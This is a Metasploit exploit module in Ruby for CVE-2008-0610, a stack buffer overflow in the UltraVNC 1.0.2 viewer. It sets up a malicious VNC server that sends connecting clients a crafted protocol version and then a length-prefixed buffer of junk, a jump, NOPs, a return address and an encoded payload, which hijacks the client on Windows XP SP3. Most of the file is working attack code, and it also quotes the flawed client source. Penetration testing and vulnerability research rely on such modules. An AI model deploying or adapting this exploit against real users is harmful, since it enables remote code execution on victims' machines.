# $Id$
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::TcpServer
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;UltraVNC 1.0.2 Client (vncviewer.exe) Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a buffer overflow in UltraVNC Viewer 1.0.2 Release.
 
                If a malicious server responds to a client connection indicating a minor
                protocol version of 14 or 16, a 32-bit integer is subsequently read from
                the TCP stream by the client and directly provided as the trusted size for
                further reading from the TCP stream into a 1024-byte character array on
                the stack.
            },
            &#039;Author&#039;         => &#039;noperand&#039;,
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2008-0610&#039; ],
                    [ &#039;OSVDB&#039;, &#039;42840&#039; ],
                    [ &#039;BID&#039;, &#039;27561&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP SP3&#039;, { &#039;Ret&#039; => 0x00421a61 } ], # vncviewer.exe, 1.0.2
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Feb 6 2008&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptPort.new(&#039;SRVPORT&#039;, [ true, "The VNCServer daemon port to listen on", 5900 ])
            ], self.class)
    end
 
    def on_client_connect(client)
        return if ((p = regenerate_payload(client)) == nil)
 
        sploit = rand_text_alpha(1100)      # junk, could be more efficient here
        sploit << "\x00\x04\x00\x00"      # value to get around a write
        sploit << rand_text_alpha(12)     # random junk
        sploit << "\xEB\x06" << make_nops(2)    # short relative jump
        sploit << [target.ret].pack(&#039;V&#039;)  # pop/pop/ret (default is in vncviewer.exe)
        sploit << payload.encoded
 
=begin
        - These bytes are read directly by a call to ReadExact() with a size of 12.
 
        ...
        if (m_minorVersion == 14 || m_minorVersion == 16)
        {
            int size;
            ReadExact((char *)&size,sizeof(int));
            char mytext[1024]; //10k
            ReadExact(mytext,size);
            mytext[size]=0;
        ...
 
        If minor version is 16 or 14, a 32-bit integer follows indicating the size of our data to read.
        We then append our data.
=end
        sploit = "\x52\x46\x42\x20\x30\x30\x33\x2e\x30\x31\x36\x0a" << [sploit.length].pack(&#039;N&#039;) << sploit
 
        print_status("Sending #{sploit.length} bytes to #{client.getpeername}:#{client.peerport}...")
        client.put(sploit)
        handler(client)
        service.close_client(client)
    end
end



